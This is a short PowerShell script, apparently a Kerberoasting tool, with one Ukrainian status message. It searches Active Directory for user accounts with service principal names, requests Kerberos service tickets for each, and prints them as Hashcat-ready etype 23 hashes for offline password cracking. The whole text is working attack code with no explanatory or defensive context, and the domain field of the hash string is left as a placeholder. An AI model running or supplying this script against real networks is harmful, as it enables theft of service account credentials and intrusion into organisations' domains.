$searcher = [adsisearcher]"(&(servicePrincipalName=*)(samAccountType=805306368))"
$targets = $searcher.FindAll()

Write-Host "`n[!] Формування хешів для Hashcat (etype 23)..." -ForegroundColor Yellow

foreach ($target in $targets) {
    $spn = $target.Properties.serviceprincipalname[0]
    $sam = $target.Properties.samaccountname[0]
    
    try {
        $tokenObj = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
        $data = $tokenObj.GetRequest()
        
        $hex = [System.BitConverter]::ToString($data).Replace("-", "").ToLower()
        
        $hashcat_format = "`$krb5tgs`$23`$*$sam`$USER_DOMAIN`$$spn`$*$hex"
        
        Write-Host "`n[+] SPN: $spn" -ForegroundColor Cyan
        Write-Host $hashcat_format
    } catch {
        
    }
}
